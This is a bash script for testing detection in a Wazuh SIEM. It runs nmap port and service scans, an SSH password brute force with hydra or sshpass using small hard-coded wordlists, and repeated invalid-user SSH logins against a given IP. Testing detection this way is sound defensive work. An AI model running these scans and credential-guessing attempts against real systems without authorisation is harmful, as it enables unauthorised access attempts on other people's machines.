#!/bin/bash
#
# Wazuh Attack Simulation Script
# Generates various security events for SIEM testing
#

set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <TARGET_AGENT_PRIVATE_IP>"
  echo "Example: $0 172.31.20.98"
  exit 1
fi

TARGET_IP="$1"

echo "=========================================="
echo "   Wazuh Security Testing - Attack Demo"
echo "=========================================="
echo "Target Agent: $TARGET_IP"
echo ""
echo "⚠️  WARNING: Only run against systems you own!"
echo ""

# Attack 1: Port Scanning (nmap)
echo "[1/4] 🔍 Port Scanning with nmap..."
nmap -sS -p 1-1000 $TARGET_IP -T4 --max-retries 1 2>/dev/null | head -20
sleep 2
echo "✓ Port scan complete"
echo ""

# Attack 2: Service Detection
echo "[2/4] 🔎 Service Version Detection..."
nmap -sV -p 22 $TARGET_IP 2>/dev/null | head -10
sleep 2
echo "✓ Service detection complete"
echo ""

# Attack 3: SSH Brute Force (lightweight)
echo "[3/4] 🔐 SSH Brute Force Attempt (25 attempts)..."
cat > /tmp/users.txt << EOF
admin
root
test
user
wazuh
EOF

cat > /tmp/passwords.txt << EOF
password
123456
admin
test123
root
EOF

if command -v hydra &> /dev/null; then
  hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://$TARGET_IP -t 2 -V 2>&1 | grep -E "host:|login:|password:" | head -15
else
  echo "Hydra not installed, using SSH attempts instead"
  for user in $(cat /tmp/users.txt); do
    for pass in $(cat /tmp/passwords.txt); do
      sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no $user@$TARGET_IP 2>/dev/null || true
    done
  done
fi
sleep 2
echo "✓ Brute force test complete"
echo ""

# Attack 4: Invalid User Attempts
echo "[4/4] 👤 Invalid User Login Attempts..."
for i in {1..10}; do
  ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no fakeuser$i@$TARGET_IP 2>/dev/null || true
  sleep 1
done
echo "✓ Invalid user attempts complete"
echo ""

echo "=========================================="
echo "✅ Attack simulation complete!"
echo "=========================================="
echo ""
echo "📊 Check Wazuh Dashboard for alerts:"
echo "   - SSH brute force attempts (Rule 5712, Level 10)"
echo "   - Invalid user login attempts (Rule 5710, Level 5)"
echo "   - Port scanning detection"
echo "   - Multiple failed authentication events"
echo ""
echo "Dashboard: https://<MANAGER_PUBLIC_IP>"
echo "Alerts should appear within 1-2 minutes"
echo ""
